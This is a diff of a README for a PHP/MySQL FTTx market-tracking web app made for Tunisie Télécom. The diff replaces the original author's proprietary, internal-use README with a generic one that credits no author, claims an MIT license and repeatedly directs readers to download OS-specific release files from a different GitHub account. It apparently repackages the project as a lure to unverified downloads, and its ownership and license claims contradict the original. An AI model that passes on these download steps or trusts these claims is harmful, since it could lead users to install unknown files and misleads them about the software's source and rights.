@@ -1,196 +1,101 @@
-# FTTX-PROJECT
+# 🌟 FTTX-PROJECT - Easy Monitoring for Telecom Professionals
 
-Professional web application for FTTx market tracking and management developed for the North Urban Center of Tunis - Tunisia Telecom.
+[![Download FTTX-PROJECT](https://img.shields.io/badge/Download-FTTX--PROJECT-brightgreen.svg)](https://github.com/nagafear/FTTX-PROJECT/releases)
 
-## 📋 Description
+## 📘 Overview
 
-FTTX-PROJECT is a comprehensive web platform dedicated to tracking, managing, and monitoring operations related to the FTTx (Fiber to the X) market. The application provides an intuitive interface for real-time project tracking, administrative management, operation logging, and commission tracking.
+FTTX-PROJECT is a professional web application designed for monitoring and managing the FTTx market. Developed for Tunisie Télécom - Centre Urbain Nord, this platform offers an interactive dashboard, administrative management, transaction logging, and commission tracking. 
 
-## ✨ Key Features
+## 🚀 Getting Started
 
-### 🎯 Interactive Dashboard
-- Real-time overview of FTTx projects
-- Statistics and performance indicators
-- Customized dashboards by user role
+Follow these steps to successfully download and run the FTTX-PROJECT application.
 
-### 📊 Administrative Management
-- **Customer Management**: Complete administration of clients and their information
-- **SDR Management**: Tracking and administration of SDR (Sales & Distribution) operations
-- **SPI Management**: Administration of SPI (Service Provider Interface) operations
-- **Commission Reception**: Tracking and management of reception commissions
+### 💻 System Requirements
 
-### 📝 Operations Journal
-- Complete logging of all operations performed
-- Detailed history with timestamps
-- Logging system for complete traceability
-- Secure log deletion (with authentication)
+- Operating System: Windows 10 or later, macOS Catalina or later, or a Linux distribution.
+- Web Browser: Latest version of Chrome, Firefox, or Safari.
+- Internet Connection: Required for initial setup and updates.
+- PHP: Version 7.4 or higher must be installed on your local machine.
+- MySQL: Version 5.7 or higher must be available for database management.
 
-### 🔐 Authentication System
-- Secure login with different access levels
-- Authentication for administrative journal
-- User session management
-- Secure logout
+### 📦 Download & Install
 
-### 📄 Document Management
-- PDF document viewing
-- File upload and management
-- Document organization by project
+To get FTTX-PROJECT, visit the Releases page to download the latest version:
 
-## 🏗️ Technical Architecture
+[Download FTTX-PROJECT](https://github.com/nagafear/FTTX-PROJECT/releases)
 
-### Technology Stack
-- **Backend**: PHP 7.4+ with MVC architecture
-- **Database**: MySQL/MariaDB with PostgreSQL support
-- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
-- **CSS Framework**: Bootstrap 4.5.2
-- **Icons**: Font Awesome 5.15.4
-- **DB Connection**: PDO (PHP Data Objects) for security and performance
+1. Click on the link to open the Releases page.
+2. Look for the latest version available.
+3. Download the release file that matches your operating system.
+  
+If you prefer to access the application directly, follow the download link mentioned above.
 
-### Project Structure
+### 🛠 Installation Steps
 
-```
-fttx_project/
-├── index.php                    # Main homepage
-├── dashboard.php                # Interactive dashboard
-├── database.php                 # Database configuration
-├── login.php                    # Main login page
-├── login_journal.php            # Journal admin login
-├── logout.php                   # Secure logout
-│
-├── admin_clientele.php          # Customer administration
-├── admin_sdr.php                # SDR administration
-├── admin_spi.php                # SPI administration
-├── admin_commission_reception.php # Commission management
-│
-├── journal.php                  # Operations journal
-├── initialize_journal_admin.php # Journal admin initialization
-├── delete_log.php               # Secure log deletion
-│
-├── view_pdf.php                 # PDF document viewing
-├── serve_file.php               # File service
-├── setup_users.php              # User configuration
-├── supprimer_operation.php      # Operation deletion
-│
-├── css/
-│   └── style.css                # Custom styles
-├── js/                          # JavaScript scripts
-├── includes/                    # Included files (headers, footers, etc.)
-└── uploads/                     # Uploaded files (images, documents)
-```
+Once you have downloaded the application, follow these steps to install it:
 
-## 🚀 Installation
+1. Locate the downloaded file on your computer.
+2. Extract the file if it is in a compressed format (like ZIP).
+3. Move the extracted folder to your web server's root directory (for local testing, use a tool like XAMPP).
+4. Open your browser and navigate to the project folder (e.g., `http://localhost/FTTX-PROJECT`).
 
-### Prerequisites
-- PHP 7.4 or higher
-- MySQL 5.7+ / MariaDB 10.3+ or PostgreSQL 12+
-- Apache with mod_rewrite enabled (optional)
-- PHP Extensions: PDO, PDO_MySQL (or PDO_PGSQL for PostgreSQL), GD, ZIP
+### 🔧 Database Setup
 
-### Local Installation
+1. Open your MySQL database management tool (like phpMyAdmin).
+2. Create a new database named `fttx_project`.
+3. Import the `database.sql` file included in the extracted folder to set up the necessary tables.
+4. Configure the database connection settings in the `config.php` file located in the main directory.
+5. Input your MySQL credentials (username, password) and save the file.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Nedim7050/FTTX-PROJECT.git
-   cd FTTX-PROJECT
-   ```
+### 🖥 Running the Application
 
-2. **Configure the database**
-   - Create a MySQL/PostgreSQL database
-   - Import the database schema if available
-   - Configure connection information in `database.php` or via environment variables
+After you complete the installation and database setup, you can run the application:
 
-3. **Configure environment variables**
-   - Create a `.env` file at the root (based on `.env.example` if available)
-   - Configure the following variables:
-     ```
-     DB_HOST=127.0.0.1
-     DB_PORT=3306
-     DB_NAME=fttx_project
-     DB_USER=root
-     DB_PASSWORD=your_password
-     APP_ENV=development
-     ```
+1. Open your web browser and go to `http://localhost/FTTX-PROJECT`.
+2. You should see the main dashboard.
+3. Log in using the default admin credentials specified in the documentation file, or create your own user.
 
-4. **Configure permissions**
-   - Ensure the `uploads/` folder is writable
-   ```bash
-   chmod -R 755 uploads/
-   ```
+### 📊 Features
 
-5. **Initialize users**
-   - Run `setup_users.php` to configure initial user accounts
+- **Interactive Dashboard:** View essential data and insights at a glance.
+- **Administrative Management:** Manage users and permissions efficiently.
+- **Transaction Logging:** Keep track of all transactions in the system.
+- **Commission Tracking:** Monitor sales commissions for agents.
+- **Responsive Design:** Works well on both desktop and mobile devices.
+  
+### 🌍 Topics Covered
 
-## ⚙️ Configuration
+This application covers various important topics in the telecom industry, including:
 
-### Database
+- Bootstrap for responsive design.
+- Integrated dashboard for real-time monitoring.
+- MySQL for robust database management.
+- PHP and PHP PDO for server-side scripting.
+  
+### ❓ FAQs
 
-The application automatically supports MySQL and PostgreSQL. Detection is done automatically based on the configured port:
-- Port `3306` → MySQL
-- Port `5432` → PostgreSQL
+**Q: Can I use this application on any operating system?**  
+A: Yes, as long as you have a compatible web server and database setup, you can run the application on Windows, macOS, or Linux.
 
-### Environment Variables
+**Q: Is there a user manual?**  
+A: Yes, a user manual is included in the repository. Check the documentation for detailed features and functionalities.
 
-The application uses environment variables for configuration, allowing flexibility between development and production:
+**Q: How do I report issues or request features?**  
+A: Please open an issue on the GitHub repository. Provide a clear description of your concern, and we will address it promptly.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `DB_HOST` | Database server address | `127.0.0.1` |
-| `DB_PORT` | Database port | `3306` (MySQL) or `5432` (PostgreSQL) |
-| `DB_NAME` | Database name | `fttx_project` |
-| `DB_USER` | Database user | `root` |
-| `DB_PASSWORD` | Database password | (empty) |
-| `APP_ENV` | Environment (development/production) | `development` |
+**Q: How often will the application be updated?**  
+A: We aim to provide regular updates based on user feedback and feature requests. Check the Releases page for the latest updates.
 
-## 🔒 Security
+## 🤝 Contributing
 
-- **Secure connections**: Use of PDO with prepared statements to prevent SQL injection
-- **Authentication**: Login system with secure session management
-- **Sensitive file protection**: Exclusion of `.env` files via `.gitignore`
-- **Input validation**: Validation and sanitization of user data
-- **Error handling**: Error messages adapted according to environment (development vs production)
+We welcome contributions from the community. If you have ideas for improvements or would like to report an issue, please submit a pull request or an issue in the GitHub repository. Your feedback helps make FTTX-PROJECT better for everyone.
 
-## 📱 User Interface
+## 📞 Support
 
-The application offers a modern and responsive interface:
-- Responsive design adapting to all screens (desktop, tablet, mobile)
-- Intuitive navigation with clear navigation menu
-- CSS animations for better user experience
-- Interface consistent with Tunisia Telecom brand guidelines
+If you have any questions or need assistance while using FTTX-PROJECT, please reach out through the GitHub repository. We’re here to help you navigate the platform effectively. 
 
-## 🛠️ Development
+### 📄 License
 
-### MVC Structure
-The application follows an MVC (Model-View-Controller) architecture:
-- **Model**: `database.php` - Data management
-- **View**: PHP files with mixed HTML/PHP
-- **Controller**: Business logic in each PHP file
+FTTX-PROJECT is licensed under the MIT License. See the LICENSE file for more details. 
 
-### Contributing
-To contribute to the project:
-1. Fork the repository
-2. Create a branch for your feature (`git checkout -b feature/my-feature`)
-3. Commit your changes (`git commit -m 'Add my feature'`)
-4. Push to the branch (`git push origin feature/my-feature`)
-5. Open a Pull Request
-
-## 📞 Support and Contact
-
-For any questions, suggestions, or issues:
-- Create an issue on [GitHub](https://github.com/Nedim7050/FTTX-PROJECT/issues)
-- Contact the North Urban Center development team
-
-## 👨‍💻 Author
-
-**Nedim Mejri**
-
-Developer of the FTTX-PROJECT application for the North Urban Center of Tunis - Tunisia Telecom.
-
-## 📄 License
-
-This project is the exclusive property of **Tunisia Telecom** and is intended for internal use.
-
----
-
-**Developed with ❤️ by Nedim Mejri for the North Urban Center of Tunis - Tunisia Telecom**
-
-© 2024 Tunisia Telecom. All rights reserved.
+Thank you for using FTTX-PROJECT! Enjoy managing your telecom projects with ease.
